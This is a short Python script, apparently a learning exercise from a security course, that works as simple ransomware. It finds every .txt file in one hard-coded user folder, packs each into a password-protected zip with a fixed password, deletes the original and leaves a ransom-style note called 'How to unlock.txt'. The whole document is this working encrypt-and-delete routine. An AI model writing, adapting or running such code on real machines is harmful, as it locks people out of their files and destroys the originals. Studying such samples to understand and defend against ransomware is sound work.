import glob
import os
import pyminizip as pyzip

def zip_and_delete(target_file):
    txt_file = target_file
    zip_file = target_file.removesuffix('.txt') + '.bad'
    prefix = None
    compression = 4
    pyzip.compress(txt_file, prefix, zip_file, "HiddenPassword^777", compression)
    os.remove(txt_file)

def leave_message():
    message_file = open("How to unlock.txt", "w")
    message_file.write("Buy Sean a cup of coffee!")
    message_file.close()


file_list = glob.iglob("C:\\Users\\sukim\\codes\\google-python-security\\malware\\*.txt")

for file in file_list:
    zip_and_delete(file)

leave_message()
print("Operation complete")